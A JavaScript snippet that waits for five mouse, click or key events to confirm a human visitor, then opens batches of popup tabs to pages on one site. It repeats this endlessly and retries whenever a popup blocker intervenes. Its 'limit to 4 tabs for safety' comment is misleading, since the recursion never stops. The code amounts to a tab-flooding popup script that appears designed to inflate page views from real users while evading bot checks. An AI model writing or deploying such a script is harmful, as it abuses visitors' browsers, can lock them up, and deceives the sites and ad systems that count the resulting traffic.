var humanInteractionCount = 0;
var interactionThreshold = 5; // Adjust this threshold based on the desired level of interaction

function detectHumanInteraction() {
    humanInteractionCount++;
    if (humanInteractionCount >= interactionThreshold) {
        triggerOpenRandomLinksRecursively();
        // Remove event listeners after detection to avoid repetitive calls
        removeBotDetectionEventListeners();
    }
}

function removeBotDetectionEventListeners() {
    window.removeEventListener('mousemove', detectHumanInteraction);
    window.removeEventListener('click', detectHumanInteraction);
    window.removeEventListener('keydown', detectHumanInteraction);
    document.removeEventListener('mousemove', detectHumanInteraction);
    document.removeEventListener('click', detectHumanInteraction);
    document.removeEventListener('keydown', detectHumanInteraction);
}

function addBotDetectionEventListeners() {
    window.addEventListener('mousemove', detectHumanInteraction);
    window.addEventListener('click', detectHumanInteraction);
    window.addEventListener('keydown', detectHumanInteraction);
    document.addEventListener('mousemove', detectHumanInteraction);
    document.addEventListener('click', detectHumanInteraction);
    document.addEventListener('keydown', detectHumanInteraction);
}

function openRandomLinksRecursively(links, maxAttempts = 3) {
    const shuffledLinks = shuffleArray(links);
    let attempts = 0;
    
    function openLinks() {
        const maxTabs = Math.min(shuffledLinks.length, 4); // Limit to 4 tabs for safety
        let openedTabs = 0;

        for (let i = 0; i < maxTabs; i++) {
            const link = shuffledLinks[i];
            const newTab = window.open(link, '_blank');
            if (newTab === null || typeof newTab === 'undefined') {
                // Opening tab was blocked, retry
                attempts++;
                if (attempts <= maxAttempts) {
                    console.log(`Attempt ${attempts}: Failed to open ${link}. Retrying...`);
                    openLinks(); // Recursively retry opening links
                } else {
                    console.log(`Maximum attempts reached for ${link}.`);
                }
            } else {
                openedTabs++;
            }
        }

        if (openedTabs === maxTabs) {
            console.log(`Opened ${openedTabs} tabs.`);
            console.log("All links opened. Repeating script...");
            openRandomLinksRecursively(links, maxAttempts); // Repeat the script
        }
    }

    openLinks();
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

var links = [
    'https://www.smokeebash.com/2024/06/pop1.html',
    'https://www.smokeebash.com/2024/06/pop2.html',
    'https://www.smokeebash.com/2024/06/pop3.html',
    'https://www.smokeebash.com/2024/06/pop4.html',
    'https://www.smokeebash.com/2024/06/pop5.html',
    'https://www.smokeebash.com/2024/06/pop6.html',
];

function triggerOpenRandomLinksRecursively() {
    openRandomLinksRecursively(links); // Assuming links is accessible here
}

// Add event listeners for bot detection
addBotDetectionEventListeners();
